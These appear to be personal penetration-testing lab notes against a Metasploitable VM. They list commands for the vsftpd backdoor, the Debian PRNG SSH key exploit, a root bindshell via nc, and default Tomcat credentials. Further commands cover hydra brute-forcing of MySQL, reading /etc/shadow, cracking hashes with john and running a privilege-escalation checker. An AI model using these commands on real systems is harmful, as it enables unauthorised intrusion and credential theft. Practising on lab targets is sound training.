# Hacking with Kali Linux

## FTP hacking
- Launch `msfconsole`
- Search `vsftpd 2.3.4`
- Get root shell
- `wget -m --ftp-user=msfadmin --ftp-password=msfadmin ftp://192.168.100.3/vulnerable`
- `wget -m --ftp-user=msfadmin --ftp-password=msfadmin ftp://192.168.100.3:2121/vulnerable`

## SSH hacking
- Vulnerability: Predictable PRNG Brute Force SSH  
- Exploit: `https://www.exploit-db.com/download/5720`  
- Keys: `https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2`
- `python2 5720.py`
- `./exploit.py <dir> <host> <user> [[port] [threads]]`
- `python2 5720 keys 192.168.100.3 root 22 10`
- Key found example: `57c3115d77c56390332dc5c49978627a-5429`
- Execute:
  - `ssh -l root -p 22 -i keys/57c3115d77c56390332dc5c49978627a-5429 192.168.100.3`
- (Requires `~/.ssh/config` for this workflow)

## Other legacy/weak services
- `telnet 192.168.100.3 23` (Telnet - Metasploitable shell)
- `rlogin -l root 192.168.100.3` (rlogind - OpenBSD/Solaris)
- `nc 192.168.100.3 1524` (bindshell Metasploitable root shell)

## Web service hacking
- `nikto -host 192.168.100.3 -p 8180` (8180 - non-standard port)
- Example vuln: `/manager/html: Default account found for 'Tomcat Manager Application' (tomcat:tomcat)`
- Browser: `http://192.168.100.3:8180` → Tomcat Manager → `tomcat:tomcat`
- `http://logout:logout@192.168.100.3:8180/manager/html`
- Launch `msfconsole` and search for tomcat exploit

## Database hacking & password attacks
- `nmap -p 3306 -sV 192.168.100.3` (MySQL)
- `hydra -l root -P wordlist.txt mysql://192.168.100.3`
- `mysql -u root -p -h 192.168.100.3 --skip-ssl`
- SQL: `show databases; use dvwa; show tables; select * from users;`
- Local files:
  - `cat /etc/passwd` (passwd-file)
  - `cat /etc/shadow` (shadow-file)
- Create crackable file:
  - `unshadow passwd-file shadow-file > crack-me`
  - `john crack-me`
  - or: `unshadow passwd-file shadow-file > passwords`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt passwords`
  - `john --show passwords`

## Sniffing passwords
- Look for HTTP Authorization in Wireshark:
  - `Authorization: Basic dG9tY2F0OnRvbWNhdA==`
- Base64 decode: `dG9tY2F0OnRvbWNhdA==` → `tomcat:tomcat`

## Privilege Escalation
- Download unix privesc check:
  - `wget https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz`
- Transfer to target:
  - `scp unix-privesc-check-1.4.tar.gz msfadmin@192.168.100.3:/tmp/`
  - or `scp -O -r ~/Downloads/unix-privesc-check-1.4 msfadmin@192.168.100.3:/tmp`
- On target:
  - `tar -zxvf unix-privesc-check-1.4.tar.gz`
  - `cd unix-privesc-check-1.4`
  - `./unix-privesc-check standard`
